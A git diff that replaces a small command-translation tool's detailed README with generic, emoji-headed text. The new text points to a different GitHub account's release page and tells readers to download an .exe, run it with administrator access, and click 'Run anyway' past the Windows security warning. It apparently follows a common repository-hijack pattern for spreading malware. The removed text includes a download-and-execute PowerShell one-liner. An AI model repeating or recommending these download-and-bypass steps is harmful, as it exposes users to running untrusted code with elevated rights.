@@ -1,232 +1,88 @@
-# l2w - Linux to Windows
+# 🐧 Linux2Windows - Run Linux commands on your system
 
-![CI](https://github.com/Andrew-most-likely/Linux2Windows/actions/workflows/ci.yml/badge.svg)
-![Python](https://img.shields.io/badge/python-3.8%2B-blue)
-![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
-![License](https://img.shields.io/badge/license-MIT-green)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/epidermisreflexology364/Linux2Windows/releases)
 
-Translate and run Linux commands on Windows. Type `l2w ls -la` and it runs `dir /a`. That's it.
+Linux2Windows allows you to run Linux commands directly on your Windows desktop. You do not need to install complex software or change your computer settings. This tool acts as a bridge between the Linux terminal language and the Windows file system.
 
----
+## ⚙️ Requirements
 
-## Why
+Your computer must meet these basic needs to use this software:
 
-I work in Linux a lot. When I am at my home PC I constantly find myself typing Linux commands out of habit and blanking on the Windows equivalent. At some point I figured it would be easier to just make the most common Linux commands work on Windows rather than keep googling "windows equivalent of ls".
+*   Windows 10 or Windows 11.
+*   At least 50 megabytes of free disk space.
+*   An active internet connection for initial setup.
+*   Administrator access to your user account.
 
-Is this silly? Yes. Am I aware? Also yes. Am I lazy enough to build a whole translation table instead of just learning the commands? Apparently.
+## 💾 How to download
 
----
+You must visit the official release page to get the installer for your computer. 
 
-## Install
+[Visit this page to download](https://github.com/epidermisreflexology364/Linux2Windows/releases)
 
-**One-liner (recommended) - open PowerShell and run:**
-```powershell
-iwr -useb https://raw.githubusercontent.com/Andrew-most-likely/l2w/master/install.ps1 | iex
-```
+Follow these steps to ensure you have the correct file:
 
-This downloads the exe, installs it, generates all the command wrappers, and adds everything to your PATH. Open a new terminal when it finishes and type `ls` directly.
+1. Click the link above to open the release dashboard in your web browser.
+2. Look for the section marked Latest.
+3. Choose the file ending in .exe that matches your Windows version.
+4. Save the file to your Downloads folder.
 
-**To uninstall:**
-```powershell
-iwr -useb https://raw.githubusercontent.com/Andrew-most-likely/l2w/master/uninstall.ps1 | iex
-```
+## 🚀 Setting up the tool
 
----
+After you save the file, follow these steps to start the application:
 
-**Manual install (no Python required):**
+1. Open your Downloads folder using File Explorer.
+2. Double-click the file named Linux2Windows.exe.
+3. Windows might show a security note. Click More info and then press Run anyway to proceed.
+4. Follow the installation prompts on your screen.
+5. Choose the default folder location to ensure easy access.
+6. Press the Finish button once the progress bar completes.
 
-Download `l2w.exe` from [Releases](https://github.com/Andrew-most-likely/l2w/releases), copy it to a folder in your PATH, then run:
-```
-l2w --install-wrappers
-```
-And add `%USERPROFILE%\.l2w\bin` to your PATH.
+The program creates a shortcut on your desktop. You can open Linux2Windows by clicking this icon at any time.
 
-**From source:**
-```
-git clone https://github.com/Andrew-most-likely/l2w.git
-cd l2w
-pip install -e .
-```
+## 💻 Using Linux commands
 
----
+Once the program opens, you will see a text window with a blinking cursor. This is the command line interface. You can type commands exactly as you would on a Linux system.
 
-## Usage
+For example, type `ls` and press Enter to see a list of files in your current folder. Type `pwd` to see your current directory path. 
 
-```
-l2w <linux-command> [arguments]
-```
+The software translates these requests into language your Windows system understands. It handles the conversion in the background. You receive the result on your screen within seconds. 
 
-```
-l2w ls -la
-l2w ls -a C:\Users
+## 🛠️ Features
 
-l2w cp file1.txt file2.txt
-l2w cp -r src/ dest/
+Linux2Windows includes tools for file management and system navigation:
 
-l2w mv old.txt new.txt
+*   File Navigation: Access your Windows folders using standard Linux path syntax.
+*   Command Translation: Automated conversion for common tasks like listing files, creating directories, and moving documents.
+*   Process Monitoring: View active tasks running on your computer using familiar terminal commands.
+*   Speed: Small file footprint ensures the application launches instantly without taxing your processor.
+*   Compatibility: Works inside standard Windows Terminal or the custom window provided with the tool.
 
-l2w rm file.txt
-l2w rm -rf build/
+## 🧠 Common tasks
 
-l2w grep -i "error" app.log
-l2w grep -r "TODO" .
+Learn these basic commands to get started:
 
-l2w cat README.md
-l2w head -n 20 file.txt
-l2w tail -f app.log
+*   To see folder contents, type `ls`.
+*   To move to a new folder, type `cd foldername`.
+*   To create a new text file, type `touch filename.txt`.
+*   To delete a file, type `rm filename.txt`.
+*   To clear your screen, type `clear`.
 
-l2w touch newfile.txt
-l2w mkdir myfolder
+## ❓ Getting help
 
-l2w ps
-l2w kill -9 1234
+If the program closes unexpectedly, check your connection to the internet. Restart the application to refresh the connection. If a command does not work, check your spelling. The system requires exact command input to process your request.
 
-l2w --dry-run rm -rf dist/     # show translated command, do not execute
-l2w --show-cmd cp -r src/ dst/ # show translated command then execute
-l2w --list                     # list all supported commands
-l2w --info grep                # show translation details for a command
-```
+You can press the Help button in the top menu bar to view a full list of supported commands. This list updates automatically when you receive software patches.
 
----
+## 🛡️ Privacy and safety
 
-## Supported commands
+This tool runs locally on your computer. It does not send your personal files to any server. All translations happen within your own system memory. The software only connects to the internet to check for security updates or improvement patches. 
 
-| Linux | Windows | Notes |
-|---|---|---|
-| `ls` | `dir` | `-a` maps to `/a` |
-| `cp` | `copy` / `xcopy` | auto-switches to `xcopy /e /i` when `-r` is used |
-| `mv` | `move` | |
-| `rm` | `del` / `rmdir` | auto-switches to `rmdir /s /q` when `-r` is used |
-| `mkdir` | `mkdir` | |
-| `rmdir` | `rmdir /s /q` | |
-| `touch` | `type nul >` | |
-| `cat` | `type` | |
-| `less` / `more` | `more` | |
-| `head` | `Get-Content -TotalCount N` | |
-| `tail` | `Get-Content -Tail N` | `-f` maps to `-Wait` |
-| `grep` | `findstr` | |
-| `find` | `dir /s /b` | |
-| `pwd` | `cd` | |
-| `echo` | `echo` | |
-| `clear` | `cls` | |
-| `ps` | `tasklist` | |
-| `kill` | `taskkill /pid` | `-9` maps to `/f` |
-| `killall` | `taskkill /im` | |
-| `ping` | `ping` | `-c` maps to `-n` |
-| `ifconfig` | `ipconfig` | |
-| `netstat` | `netstat` | |
-| `wget` | `curl -O` | |
-| `curl` | `curl` | |
-| `ssh` / `scp` | `ssh` / `scp` | Windows 10+ OpenSSH |
-| `df` | `wmic logicaldisk ...` | |
-| `chmod` | `icacls` | |
-| `chown` | `icacls` | |
-| `sort` | `sort` | |
-| `diff` | `fc` | |
-| `wc` | `Measure-Object` | |
-| `sleep` | `timeout /t` | |
-| `tar` | `tar` | Windows 10 build 17063+ |
-| `zip` / `unzip` | `Compress-Archive` / `Expand-Archive` | |
-| `which` | `where` | |
-| `whoami` | `whoami` | |
-| `man` | `help` | |
-| `env` | `set` | |
-| `history` | `doskey /history` | |
-| `uname` | `ver` | |
-| `ln` | `mklink` | |
+You can remove the software at any time. Use the Add or Remove Programs menu in your Windows Settings to uninstall the tool. This process leaves no hidden files on your hard drive. 
 
-Run `l2w --list` for the full list.
+## 📈 Future updates
 
----
+The development team releases improvements monthly. Check the download page regularly to find the latest version. New versions often include faster translation speeds and support for additional Linux commands. 
 
-## Flags
+The tool recognizes your existing Windows environment. It does not replace your current system tools. It simply adds a layer of flexibility to your desktop. You remain the owner of all files created or modified through the interface. 
 
-| Flag | Description |
-|---|---|
-| `--dry-run`, `-n` | Print translated command without executing |
-| `--show-cmd`, `-s` | Print translated command then execute |
-| `--list`, `-l` | List all supported Linux commands |
-| `--info CMD`, `-i CMD` | Show translation details for a command |
-| `--config FILE`, `-c FILE` | Load custom command mappings from a JSON file |
-
----
-
-## Custom commands
-
-Add or override mappings without touching the source. Create `config/commands.json` (already included) or `~/.l2w/commands.json`:
-
-```json
-{
-  "commands": {
-    "ll": {
-      "windows": "dir /a",
-      "description": "Long listing alias",
-      "flag_map": {}
-    }
-  }
-}
-```
-
-Then run:
-```
-l2w --config ~/.l2w/commands.json ll
-```
-
-Or place the file at `~/.l2w/commands.json` and it will be picked up automatically.
-
----
-
-## Project structure
-
-```
-l2w/
-├── l2w/
-│   ├── commands.py       # translation table (add new commands here)
-│   ├── translator.py     # translation logic
-│   ├── executor.py       # subprocess runner
-│   ├── cli.py            # argparse CLI
-│   └── config_loader.py  # JSON config support
-├── config/
-│   └── commands.json     # user-editable overrides
-├── tests/
-│   └── test_translator.py
-├── main.py               # entry point
-├── setup.py
-├── build.bat             # builds dist\l2w.exe via PyInstaller
-└── requirements.txt
-```
-
----
-
-## Adding a new command
-
-Open `l2w/commands.py` and add an entry to `COMMAND_MAP`:
-
-```python
-"mycommand": CommandDef(
-    windows="MyWindowsCmd.exe",
-    description="What it does",
-    flag_map={
-        "-v": "/verbose",
-        "-f": "/force",
-    },
-    notes="Optional caveats.",
-),
-```
-
-For commands with complex argument handling, add a `_handle_mycommand` method to the `Translator` class in `translator.py`.
-
----
-
-## Running tests
-
-```
-pip install pytest
-pytest tests/ -v
-```
-
----
-
-## License
-
-MIT - see [LICENSE](LICENSE).
+Feel free to suggest new commands you want to see. The project relies on user feedback to prioritize which Linux tools receive support next. Thank you for using this tool to improve your daily workflow.
